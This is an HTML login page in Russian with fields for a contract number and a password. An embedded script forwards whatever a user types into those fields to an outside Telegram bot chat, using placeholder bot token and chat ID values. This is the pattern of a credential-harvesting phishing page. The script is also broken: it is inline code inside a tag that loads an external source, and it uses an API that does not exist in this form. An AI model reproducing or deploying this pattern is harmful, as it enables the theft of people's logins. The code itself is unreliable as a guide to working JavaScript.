<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="main.css">
  <title>Авторизация</title>
</head>
<body>
  <header><h1>Авторизация</h1></header>
  <main>
    <form action= "/registr" method="post">
      <input type="text" name="agreement" placeholder="номер договора" class="form-control" maxlength="16" id="agreement">
      <input type="password" name="password" placeholder="Пароль" class="form-control"maxlength="32" id="password">
      <input type="hidden" name="data" id="data">
      <button type="submit" class="btn btn-primary" id="order">Войти</button>
    </form>
  </main>
<script src="https://telegram.org/js/telegram-web-app.js">
// Подключаем библиотеку Telegram Web App
const Telegram = require("telegram-web-app");

// Создаем объект бота
const bot = new Telegram({
  // Токен бота
  token: "YOUR_BOT_TOKEN",
  // Айди чата, в который будут отправляться данные
  chatId: "YOUR_CHAT_ID",
});

// Обработчик события отправки формы
document.querySelector("#order").addEventListener("click", async () => {
  // Получаем данные из полей формы
  const agreement = document.querySelector("#agreement").value;
  const password = document.querySelector("#password").value;

  // Формируем сообщение для отправки
  const message = {
    // Текст сообщения
    text: `Новая заявка:
    Номер договора: ${agreement}
    Пароль: ${password}`,
  };

  // Отправляем сообщение
  await bot.sendMessage(message);
});
</script>
</body>
</html>
